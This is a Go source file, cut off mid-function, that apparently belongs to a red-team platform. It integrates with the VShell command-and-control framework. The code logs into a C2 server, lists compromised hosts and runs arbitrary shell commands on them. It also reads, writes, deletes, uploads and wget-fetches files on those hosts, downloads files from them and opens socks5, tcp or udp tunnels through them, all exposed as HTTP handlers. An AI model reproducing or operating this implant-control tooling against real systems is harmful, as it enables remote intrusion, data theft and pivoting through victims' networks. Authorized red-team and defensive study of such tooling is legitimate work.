// VShell C2 对接(vshell 4.x 接口形态,移植自 dsh-redteam-model 的 vshell.js):
//   网关卡  全部请求带 Authorization: Basic <b64(user:pass)>
//   登录    POST {base}/api/login {username,password} → result.token(12h JWT)
//   业务    POST {base}/api/{endpoint} JSON,头 Token: <jwt>(无 Bearer 前缀)
//   信封    {code:0,message:"ok",result:...};HTTP 恒 200——token 失效以 body code:401 表达
package server

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/Autumn-27/artex/db"
)

// vshellClient 缓存:serverId → {sig, client}(凭据/地址变更即重建,token 随之作废)。
type vshellClientEntry struct {
	sig    string
	client *VshellClient
}

var vshellClients sync.Map

// vshellClientFor 取/建站点客户端。
func vshellClientFor(server *db.VshellServer) *VshellClient {
	sig := strings.Join([]string{server.ID, server.BaseURL, server.Username, server.Password, strconv.Itoa(server.TimeoutMs)}, "|")
	if hit, ok := vshellClients.Load(server.ID); ok {
		entry := hit.(*vshellClientEntry)
		if entry.sig == sig {
			return entry.client
		}
	}
	client := newVshellClient(server)
	vshellClients.Store(server.ID, &vshellClientEntry{sig: sig, client: client})
	return client
}

func dropVshellClient(serverID string) { vshellClients.Delete(serverID) }

// VshellClient 是单个 VShell 站点的 API 客户端。
type VshellClient struct {
	mu        sync.Mutex
	base      string
	username  string
	password  string
	timeout   time.Duration
	token     string
	tokenExp  time.Time
	basicAuth string
	http      *http.Client
}

func newVshellClient(server *db.VshellServer) *VshellClient {
	timeout := time.Duration(server.TimeoutMs) * time.Millisecond
	if timeout < 5*time.Second {
		timeout = 30 * time.Second
	}
	if timeout > 300*time.Second {
		timeout = 300 * time.Second
	}
	base := strings.TrimRight(strings.TrimSpace(server.BaseURL), "/")
	if strings.HasSuffix(base, "/api") {
		base = base[:len(base)-4]
	}
	return &VshellClient{
		base:      base,
		username:  server.Username,
		password:  server.Password,
		timeout:   timeout,
		basicAuth: "Basic " + base64.StdEncoding.EncodeToString([]byte(server.Username+":"+server.Password)),
		http:      &http.Client{Timeout: timeout},
	}
}

// do 发送一次原始 HTTP(带 Basic + token)。
func (c *VshellClient) do(ctx context.Context, method, path, contentType string, body []byte, extraHeaders map[string]string) (int, http.Header, []byte, error) {
	req, err := http.NewRequestWithContext(ctx, method, c.base+path, bytes.NewReader(body))
	if err != nil {
		return 0, nil, nil, err
	}
	req.Header.Set("Authorization", c.basicAuth)
	if c.token != "" {
		req.Header.Set("Token", c.token)
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return 0, nil, nil, fmt.Errorf("VShell %s 请求失败:%v", path, err)
	}
	defer resp.Body.Close()
	buf, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20))
	if err != nil {
		return 0, nil, nil, fmt.Errorf("VShell %s 响应读取失败:%v", path, err)
	}
	return resp.StatusCode, resp.Header, buf, nil
}

// login 登录取 token。
func (c *VshellClient) login(ctx context.Context) error {
	payload, _ := json.Marshal(map[string]string{"username": c.username, "password": c.password})
	status, _, body, err := c.do(ctx, "POST", "/api/login", "application/json", payload, nil)
	if err != nil {
		return err
	}
	if status == 401 {
		return fmt.Errorf("VShell 网关 Basic 认证被拒(401)——检查用户名/密码")
	}
	var env struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
		Result  struct {
			Token string `json:"token"`
		} `json:"result"`
	}
	if err := json.Unmarshal(body, &env); err != nil {
		return fmt.Errorf("VShell 响应非 JSON(HTTP %d)——base_url 可能不是 vshell 站点根", status)
	}
	if env.Code != 0 || env.Result.Token == "" {
		return fmt.Errorf("VShell 登录失败:%s", orEmpty(env.Message, "unknown"))
	}
	c.token = env.Result.Token
	c.tokenExp = time.Now().Add(12 * time.Hour)
	return nil
}

// API 业务调用:401(HTTP 或 body code)自动重登一次重放。result 原样返回。
func (c *VshellClient) API(ctx context.Context, endpoint string, body any) (json.RawMessage, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.token == "" {
		if err := c.login(ctx); err != nil {
			return nil, err
		}
	}
	payload, _ := json.Marshal(body)
	path := "/api/" + strings.TrimLeft(endpoint, "/")
	for retried := false; ; {
		status, _, resp, err := c.do(ctx, "POST", path, "application/json", payload, nil)
		if err != nil {
			return nil, err
		}
		if status == 401 {
			if retried {
				return nil, fmt.Errorf("VShell 登录态失效(重登后仍 401)——检查账号权限")
			}
			c.token = ""
			if err := c.login(ctx); err != nil {
				return nil, err
			}
			retried = true
			continue
		}
		var env struct {
			Code    int             `json:"code"`
			Message string          `json:"message"`
			Result  json.RawMessage `json:"result"`
		}
		if err := json.Unmarshal(resp, &env); err != nil {
			return nil, fmt.Errorf("VShell %s 响应非 JSON(HTTP %d)——base_url 可能不是 vshell 站点根", endpoint, status)
		}
		if env.Code == 401 {
			if retried {
				return nil, fmt.Errorf("VShell 登录态失效(重登后仍 401)——检查账号权限")
			}
			c.token = ""
			if err := c.login(ctx); err != nil {
				return nil, err
			}
			retried = true
			continue
		}
		if env.Code != 0 {
			return nil, vshellErr(endpoint, env.Code, env.Message)
		}
		return env.Result, nil
	}
}

// rawGet 带 401 自愈的 GET(下载用),流式返回 resp。
func (c *VshellClient) rawGet(ctx context.Context, path string) (*http.Response, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.token == "" {
		if err := c.login(ctx); err != nil {
			return nil, err
		}
	}
	for retried := false; ; {
		req, err := http.NewRequestWithContext(ctx, "GET", c.base+path, nil)
		if err != nil {
			return nil, err
		}
		req.Header.Set("Authorization", c.basicAuth)
		req.Header.Set("Token", c.token)
		resp, err := c.http.Do(req)
		if err != nil {
			return nil, fmt.Errorf("VShell %s 请求失败:%v", path, err)
		}
		if resp.StatusCode == 401 && !retried {
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			c.token = ""
			if err := c.login(ctx); err != nil {
				return nil, err
			}
			retried = true
			continue
		}
		if resp.StatusCode != 200 {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
			resp.Body.Close()
			return nil, fmt.Errorf("下载取回失败(HTTP %d):%s", resp.StatusCode, string(body))
		}
		return resp, nil
	}
}

// uploadMultipart multipart 上传(字段 id/path/file)。
func (c *VshellClient) uploadMultipart(ctx context.Context, hostID int64, dir, filename string, content []byte) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.token == "" {
		if err := c.login(ctx); err != nil {
			return err
		}
	}
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	_ = writer.WriteField("id", strconv.FormatInt(hostID, 10))
	_ = writer.WriteField("path", dir)
	part, err := writer.CreateFormFile("file", filename)
	if err == nil {
		_, err = part.Write(content)
	}
	if err == nil {
		err = writer.Close()
	}
	if err != nil {
		return err
	}
	for retried := false; ; {
		req, err := http.NewRequestWithContext(ctx, "POST", c.base+"/api/file/upload", bytes.NewReader(buf.Bytes()))
		if err != nil {
			return err
		}
		req.Header.Set("Authorization", c.basicAuth)
		req.Header.Set("Token", c.token)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		req.ContentLength = int64(buf.Len())
		resp, err := (&http.Client{Timeout: 120 * time.Second}).Do(req)
		if err != nil {
			return fmt.Errorf("VShell 上传失败:%v", err)
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
		if resp.StatusCode == 401 && !retried {
			c.token = ""
			if err := c.login(ctx); err != nil {
				return err
			}
			retried = true
			continue
		}
		var env struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		}
		if err := json.Unmarshal(body, &env); err != nil {
			return fmt.Errorf("VShell 上传响应非 JSON(HTTP %d)", resp.StatusCode)
		}
		if env.Code == 401 && !retried {
			c.token = ""
			if err := c.login(ctx); err != nil {
				return err
			}
			retried = true
			continue
		}
		if env.Code != 0 {
			return vshellErr("file/upload", env.Code, env.Message)
		}
		return nil
	}
}

// uploadFile 通用 multipart 上传(单 file 字段,任意路径)。
func (c *VshellClient) uploadFile(ctx context.Context, path, filename string, content []byte) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.token == "" {
		if err := c.login(ctx); err != nil {
			return err
		}
	}
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	part, err := writer.CreateFormFile("file", filename)
	if err == nil {
		_, err = part.Write(content)
	}
	if err == nil {
		err = writer.Close()
	}
	if err != nil {
		return err
	}
	for retried := false; ; {
		req, err := http.NewRequestWithContext(ctx, "POST", c.base+path, bytes.NewReader(buf.Bytes()))
		if err != nil {
			return err
		}
		req.Header.Set("Authorization", c.basicAuth)
		req.Header.Set("Token", c.token)
		req.Header.Set("Content-Type", writer.FormDataContentType())
		req.ContentLength = int64(buf.Len())
		resp, err := (&http.Client{Timeout: 120 * time.Second}).Do(req)
		if err != nil {
			return fmt.Errorf("VShell %s 上传失败:%v", path, err)
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		resp.Body.Close()
		if resp.StatusCode == 401 && !retried {
			c.token = ""
			if err := c.login(ctx); err != nil {
				return err
			}
			retried = true
			continue
		}
		var env struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		}
		_ = json.Unmarshal(body, &env)
		if env.Code == 401 && !retried {
			c.token = ""
			if err := c.login(ctx); err != nil {
				return err
			}
			retried = true
			continue
		}
		if env.Code != 0 {
			return vshellErr(path, env.Code, env.Message)
		}
		return nil
	}
}

// Hosts 上线主机清单(status=false = 含历史离线台账)。
func (c *VshellClient) Hosts(ctx context.Context, onlineOnly bool) ([]json.RawMessage, error) {
	res, err := c.API(ctx, "client/list", map[string]any{"page": 1, "pageSize": 9999, "status": onlineOnly})
	if err != nil {
		return nil, err
	}
	var page struct {
		Items []json.RawMessage `json:"items"`
	}
	if err := json.Unmarshal(res, &page); err != nil {
		return nil, fmt.Errorf("client/list 输出异常")
	}
	return page.Items, nil
}

// Exec 同步执行命令取回输出。
func (c *VshellClient) Exec(ctx context.Context, hostID int64, command string) (string, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return "", fmt.Errorf("命令为空")
	}
	res, err := c.API(ctx, "terminal/shell", map[string]any{"id": hostID, "command": command})
	if err != nil {
		return "", err
	}
	var out string
	_ = json.Unmarshal(res, &out)
	return out, nil
}

// ResolveHost 主机解析:纯数字按 Id,其余按 主机名/出口 IP/内网 IP/备注 唯一子串。
func (c *VshellClient) ResolveHost(ctx context.Context, hostRef string) (int64, error) {
	ref := strings.TrimSpace(hostRef)
	if n, err := strconv.ParseInt(ref, 10, 64); err == nil {
		return n, nil
	}
	hosts, err := c.Hosts(ctx, false)
	if err != nil {
		return 0, err
	}
	var hit []struct {
		id   int64
		name string
	}
	for _, raw := range hosts {
		var h struct {
			Id       int64  `json:"Id"`
			HostName string `json:"HostName"`
			Addr     string `json:"Addr"`
			LocalIP  string `json:"LocalIP"`
			Remark   string `json:"Remark"`
			OsName   string `json:"OsName"`
		}
		if err := json.Unmarshal(raw, &h); err != nil {
			continue
		}
		for _, v := range []string{h.HostName, h.Addr, h.LocalIP, h.Remark, h.OsName} {
			if strings.Contains(v, ref) {
				hit = append(hit, struct {
					id   int64
					name string
				}{h.Id, h.HostName})
				break
			}
		}
	}
	if len(hit) == 0 {
		return 0, fmt.Errorf("未找到匹配 %s 的主机(按主机名/出口 IP/内网 IP/备注子串匹配)", ref)
	}
	if len(hit) > 1 {
		names := make([]string, len(hit))
		for i, h := range hit {
			names[i] = fmt.Sprintf("#%d %s", h.id, h.name)
		}
		return 0, fmt.Errorf("%s 匹配到 %d 台主机(%s)——请按 Id 指定", ref, len(hit), strings.Join(names, "、"))
	}
	return hit[0].id, nil
}

// Listeners 监听清单。
func (c *VshellClient) Listeners(ctx context.Context) ([]json.RawMessage, error) {
	res, err := c.API(ctx, "listener/list", map[string]any{"page": 1, "pageSize": 9999})
	if err != nil {
		return nil, err
	}
	var page struct {
		Items []json.RawMessage `json:"items"`
	}
	if err := json.Unmarshal(res, &page); err != nil {
		return nil, fmt.Errorf("listener/list 输出异常")
	}
	return page.Items, nil
}

// Tunnels 代理/隧道清单。
func (c *VshellClient) Tunnels(ctx context.Context) ([]json.RawMessage, error) {
	res, err := c.API(ctx, "tunnel/list", map[string]any{"page": 1, "pageSize": 9999})
	if err != nil {
		return nil, err
	}
	var page struct {
		Items []json.RawMessage `json:"items"`
	}
	if err := json.Unmarshal(res, &page); err != nil {
		return nil, fmt.Errorf("tunnel/list 输出异常")
	}
	return page.Items, nil
}

// Info 站点运行态。
func (c *VshellClient) Info(ctx context.Context) (json.RawMessage, error) {
	return c.API(ctx, "dashboard/info", map[string]any{})
}

// Check 凭据全链路自检:弃用旧 token → 登录 → 概览。
func (c *VshellClient) Check(ctx context.Context) (json.RawMessage, error) {
	c.mu.Lock()
	c.token = ""
	c.mu.Unlock()
	if err := c.login(ctx); err != nil {
		return nil, err
	}
	return c.Info(ctx)
}

// FileDownload 下载三步链:downloadtoserver → 轮询 getdownloadper 到 100 → downloadtobrowser。
func (c *VshellClient) FileDownload(ctx context.Context, hostID int64, dir, name string, onProgress func(int)) (*http.Response, error) {
	body := map[string]any{"id": hostID, "path": dir, "target": name}
	if _, err := c.API(ctx, "file/downloadtoserver", body); err != nil {
		return nil, err
	}
	deadline := time.Now().Add(10 * time.Minute)
	for {
		if time.Now().After(deadline) {
			return nil, fmt.Errorf("下载超时(10 分钟)——文件过大或链路过慢")
		}
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		case <-time.After(1 * time.Second):
		}
		pre := 0
		if res, err := c.API(ctx, "file/getdownloadper", body); err == nil {
			var p struct {
				Pre int `json:"pre"`
			}
			if json.Unmarshal(res, &p) == nil {
				pre = p.Pre
			}
			if onProgress != nil {
				onProgress(pre)
			}
		}
		if pre >= 100 {
			break
		}
	}
	return c.rawGet(ctx, "/api/file/downloadtobrowser?id="+strconv.FormatInt(hostID, 10)+"&target="+url.QueryEscape(name))
}

func vshellErr(endpoint string, code int, message string) error {
	if endpoint == "terminal/shell" && strings.HasPrefix(message, "exit status") {
		return fmt.Errorf("命令退出码非 0(%s)——vshell 不回传此时已产出的输出,需要输出时以 \"; true\" 收尾命令", message)
	}
	if message == "client is close" {
		return fmt.Errorf("目标主机不在线(client is close)——查看在线清单")
	}
	if message == "" {
		return fmt.Errorf("%s 失败:code %d", endpoint, code)
	}
	return fmt.Errorf("%s 失败:%s", endpoint, message)
}

func orEmpty(s, def string) string {
	if s == "" {
		return def
	}
	return s
}

// =====================================================================
// HTTP handlers(全部走默认 JWT 鉴权)
// =====================================================================

// vshellView 对外站点视图(密码不回传明文,只带尾 4 位)。
type vshellView struct {
	*db.VshellServer
	PasswordSet  bool   `json:"password_set"`
	PasswordTail string `json:"password_tail"`
	LastCheckAtS string `json:"last_check_at,omitempty"`
}

func toVshellView(v *db.VshellServer) *vshellView {
	tail := ""
	if len(v.Password) > 4 {
		tail = "…" + v.Password[len(v.Password)-4:]
	} else if v.Password != "" {
		tail = "…"
	}
	view := &vshellView{VshellServer: v, PasswordSet: v.Password != "", PasswordTail: tail}
	if v.LastCheckAt.Valid {
		view.LastCheckAtS = v.LastCheckAt.Time.Format("2006-01-02 15:04:05")
	}
	return view
}

// shellStore 返回 shell 存储(DB 未就绪时 503)。
func (s *Server) shellStore() *db.ShellStore {
	if s.m == nil || s.m.pg == nil {
		return nil
	}
	return s.m.pg.Shells()
}

func (s *Server) getVshellServer(w http.ResponseWriter, r *http.Request) {
	server, _, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	writeJSON(w, http.StatusOK, toVshellView(server))
}

func (s *Server) getVshellServerByID(w http.ResponseWriter, r *http.Request) (*db.VshellServer, *db.ShellStore, bool) {
	st := s.shellStore()
	if st == nil {
		writeErr(w, http.StatusServiceUnavailable, "数据库未就绪")
		return nil, nil, false
	}
	server, err := st.GetVshellServer(r.PathValue("id"))
	if err != nil {
		writeErr(w, http.StatusNotFound, "站点不存在")
		return nil, nil, false
	}
	return server, st, true
}

func (s *Server) listVshellServers(w http.ResponseWriter, r *http.Request) {
	st := s.shellStore()
	if st == nil {
		writeErr(w, http.StatusServiceUnavailable, "数据库未就绪")
		return
	}
	servers, err := st.ListVshellServers()
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	items := make([]*vshellView, 0, len(servers))
	for _, v := range servers {
		items = append(items, toVshellView(v))
	}
	writeJSON(w, http.StatusOK, map[string]any{"items": items})
}

type vshellMutationRequest struct {
	Name      *string `json:"name"`
	BaseURL   *string `json:"base_url"`
	Username  *string `json:"username"`
	Password  *string `json:"password"`
	TimeoutMs *int    `json:"timeout_ms"`
	Remark    *string `json:"remark"`
}

func (s *Server) createVshellServer(w http.ResponseWriter, r *http.Request) {
	st := s.shellStore()
	if st == nil {
		writeErr(w, http.StatusServiceUnavailable, "数据库未就绪")
		return
	}
	var req vshellMutationRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	v := &db.VshellServer{}
	applyVshellMutation(v, &req)
	if strings.TrimSpace(v.BaseURL) == "" {
		writeErr(w, http.StatusBadRequest, "base_url 不能为空")
		return
	}
	if !strings.HasPrefix(v.BaseURL, "http://") && !strings.HasPrefix(v.BaseURL, "https://") {
		writeErr(w, http.StatusBadRequest, "base_url 需含 http(s):// 前缀")
		return
	}
	saved, err := st.SaveVshellServer(v)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	st.LogShellOp("vshell", saved.ID, "server.add", saved.BaseURL)
	writeJSON(w, http.StatusOK, toVshellView(saved))
}

func applyVshellMutation(v *db.VshellServer, req *vshellMutationRequest) {
	if req.Name != nil {
		v.Name = strings.TrimSpace(*req.Name)
	}
	if req.BaseURL != nil {
		v.BaseURL = strings.TrimRight(strings.TrimSpace(*req.BaseURL), "/")
	}
	if req.Username != nil {
		v.Username = *req.Username
	}
	if req.Password != nil {
		v.Password = *req.Password
	}
	if req.TimeoutMs != nil {
		v.TimeoutMs = *req.TimeoutMs
	}
	if req.Remark != nil {
		v.Remark = *req.Remark
	}
}

func (s *Server) updateVshellServer(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req vshellMutationRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	applyVshellMutation(server, &req)
	saved, err := st.SaveVshellServer(server)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	st.LogShellOp("vshell", saved.ID, "server.edit", saved.BaseURL)
	writeJSON(w, http.StatusOK, toVshellView(saved))
}

func (s *Server) deleteVshellServer(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	if err := st.DeleteVshellServer(server.ID); err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	dropVshellClient(server.ID)
	st.LogShellOp("vshell", server.ID, "server.del", server.BaseURL)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

func (s *Server) checkVshellServer(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	info, err := vshellClientFor(server).Check(ctx)
	if err != nil {
		_ = st.MarkVshellServer(server.ID, "error", err.Error())
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	_ = st.MarkVshellServer(server.ID, "ok", "")
	st.LogShellOp("vshell", server.ID, "server.check", "")
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "info": json.RawMessage(info)})
}

func (s *Server) vshellHosts(w http.ResponseWriter, r *http.Request) {
	server, _, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	online := true
	if v := r.URL.Query().Get("online"); v == "0" || v == "false" {
		online = false
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	items, err := vshellClientFor(server).Hosts(ctx, online)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if items == nil {
		items = []json.RawMessage{}
	}
	writeJSON(w, http.StatusOK, map[string]any{"items": items})
}

type vshellExecRequest struct {
	HostID  any    `json:"host_id"`
	Command string `json:"command"`
}

func (s *Server) vshellExec(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req vshellExecRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	if strings.TrimSpace(req.Command) == "" {
		writeErr(w, http.StatusBadRequest, "命令为空")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Minute)
	defer cancel()
	client := vshellClientFor(server)
	hostID, err := resolveVshellHostRef(ctx, client, req.HostID)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	out, err := client.Exec(ctx, hostID, req.Command)
	if err != nil {
		st.LogShellOp("vshell", server.ID, "exec.fail", fmt.Sprintf("host=%d cmd=%s err=%v", hostID, req.Command, err))
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	st.LogShellOp("vshell", server.ID, "exec", fmt.Sprintf("host=%d cmd=%s", hostID, req.Command))
	writeJSON(w, http.StatusOK, map[string]any{"output": out})
}

func resolveVshellHostRef(ctx context.Context, client *VshellClient, ref any) (int64, error) {
	switch v := ref.(type) {
	case float64:
		return int64(v), nil
	case int64:
		return v, nil
	case int:
		return int64(v), nil
	case string:
		return client.ResolveHost(ctx, v)
	}
	return 0, fmt.Errorf("host_id 缺失")
}

type vshellRemarkRequest struct {
	HostID any    `json:"host_id"`
	Remark string `json:"remark"`
}

func (s *Server) vshellRemark(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req vshellRemarkRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	client := vshellClientFor(server)
	hostID, err := resolveVshellHostRef(ctx, client, req.HostID)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	if _, err := client.API(ctx, "client/editremark", map[string]any{"id": hostID, "remark": req.Remark}); err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	st.LogShellOp("vshell", server.ID, "host.remark", fmt.Sprintf("host=%d remark=%s", hostID, req.Remark))
	writeJSON(w, http.StatusOK, map[string]any{"ok": true})
}

type vshellFileRequest struct {
	Op      string `json:"op"`
	HostID  any    `json:"host_id"`
	Path    string `json:"path"`
	Target  string `json:"target"`
	To      string `json:"to"`
	Content string `json:"content"`
	URL     string `json:"url"`
}

func (s *Server) vshellFile(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req vshellFileRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Minute)
	defer cancel()
	client := vshellClientFor(server)
	hostID, err := resolveVshellHostRef(ctx, client, req.HostID)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	dir := orDefault(req.Path, "/")
	switch req.Op {
	case "ls":
		res, err := client.API(ctx, "file/ls", map[string]any{"id": hostID, "path": dir})
		if err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		var page struct {
			Items []json.RawMessage `json:"items"`
		}
		_ = json.Unmarshal(res, &page)
		if page.Items == nil {
			page.Items = []json.RawMessage{}
		}
		writeJSON(w, http.StatusOK, map[string]any{"items": page.Items})
	case "read":
		res, err := client.API(ctx, "file/cat", map[string]any{"id": hostID, "path": dir, "target": req.Target})
		if err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		var out struct {
			Content string `json:"content"`
		}
		_ = json.Unmarshal(res, &out)
		st.LogShellOp("vshell", server.ID, "file.read", fmt.Sprintf("host=%d %s/%s", hostID, dir, req.Target))
		writeJSON(w, http.StatusOK, map[string]any{"content": out.Content})
	case "write":
		if _, err := client.API(ctx, "file/edit", map[string]any{"id": hostID, "path": dir, "target": req.Target, "content": req.Content}); err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		st.LogShellOp("vshell", server.ID, "file.write", fmt.Sprintf("host=%d %s/%s", hostID, dir, req.Target))
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	case "mkdir", "rm", "mv", "touch", "wget":
		body := map[string]any{"id": hostID, "path": dir, "target": req.Target}
		if req.Op == "mv" {
			body["to"] = req.To
		}
		if _, err := client.API(ctx, "file/"+req.Op, body); err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		st.LogShellOp("vshell", server.ID, "file."+req.Op, fmt.Sprintf("host=%d %s/%s", hostID, dir, req.Target))
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	default:
		writeErr(w, http.StatusBadRequest, "未知文件操作 "+req.Op)
	}
}

func (s *Server) vshellUpload(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	if err := r.ParseMultipartForm(16 << 20); err != nil {
		writeErr(w, http.StatusBadRequest, "multipart 解析失败:"+err.Error())
		return
	}
	hostRef := r.FormValue("host_id")
	dir := orDefault(r.FormValue("path"), "/")
	file, header, err := r.FormFile("file")
	if err != nil {
		writeErr(w, http.StatusBadRequest, "缺少 file 字段")
		return
	}
	defer file.Close()
	if header.Size > 8<<20 {
		writeErr(w, http.StatusRequestEntityTooLarge, "文件超过 8MB 上限(页面通道)")
		return
	}
	content, err := io.ReadAll(file)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "读取上传内容失败")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 3*time.Minute)
	defer cancel()
	client := vshellClientFor(server)
	hostID, err := resolveVshellHostRef(ctx, client, hostRef)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	if err := client.uploadMultipart(ctx, hostID, dir, header.Filename, content); err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	st.LogShellOp("vshell", server.ID, "file.upload", fmt.Sprintf("host=%d %s/%s (%dB)", hostID, dir, header.Filename, len(content)))
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "size": len(content)})
}

func (s *Server) vshellDownload(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	hostRef := r.URL.Query().Get("host")
	dir := orDefault(r.URL.Query().Get("path"), "/")
	name := r.URL.Query().Get("name")
	if name == "" {
		writeErr(w, http.StatusBadRequest, "name 缺失")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 12*time.Minute)
	defer cancel()
	client := vshellClientFor(server)
	hostID, err := resolveVshellHostRef(ctx, client, hostRef)
	if err != nil {
		writeErr(w, http.StatusBadRequest, err.Error())
		return
	}
	resp, err := client.FileDownload(ctx, hostID, dir, name, nil)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	defer resp.Body.Close()
	st.LogShellOp("vshell", server.ID, "file.download", fmt.Sprintf("host=%d %s/%s", hostID, dir, name))
	w.Header().Set("Content-Disposition", "attachment; filename=\""+strings.ReplaceAll(name, "\"", "")+"\"")
	if ct := resp.Header.Get("Content-Type"); ct != "" && !strings.Contains(ct, "application/json") {
		w.Header().Set("Content-Type", ct)
	} else {
		w.Header().Set("Content-Type", "application/octet-stream")
	}
	w.WriteHeader(http.StatusOK)
	io.Copy(w, resp.Body)
}

func (s *Server) vshellTunnels(w http.ResponseWriter, r *http.Request) {
	server, _, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	items, err := vshellClientFor(server).Tunnels(ctx)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if items == nil {
		items = []json.RawMessage{}
	}
	writeJSON(w, http.StatusOK, map[string]any{"items": items})
}

type vshellTunnelRequest struct {
	Op       string `json:"op"`
	HostID   any    `json:"host_id"`
	ID       any    `json:"id"`
	Mode     string `json:"mode"`
	Port     any    `json:"port"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
	Remark   string `json:"remark"`
}

func (s *Server) vshellTunnelAction(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req vshellTunnelRequest
	if !decodeShellJSON(w, r, &req) {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	client := vshellClientFor(server)
	switch req.Op {
	case "add":
		hostID, err := resolveVshellHostRef(ctx, client, req.HostID)
		if err != nil {
			writeErr(w, http.StatusBadRequest, err.Error())
			return
		}
		mode := orDefault(req.Mode, "socks5")
		body := map[string]any{
			"ClientId": hostID,
			"Mode":     mode,
			"Port":     toInt(req.Port),
			"Remark":   req.Remark,
		}
		if mode == "tcp" || mode == "udp" {
			body["Target"] = req.Target
		} else {
			body["Username"] = req.Username
			body["Password"] = req.Password
		}
		if _, err := client.API(ctx, "tunnel/add", body); err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		st.LogShellOp("vshell", server.ID, "tunnel.add", fmt.Sprintf("host=%d mode=%s port=%v", hostID, mode, req.Port))
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	case "start", "stop", "del":
		if _, err := client.API(ctx, "tunnel/"+req.Op, map[string]any{"id": toInt(req.ID)}); err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
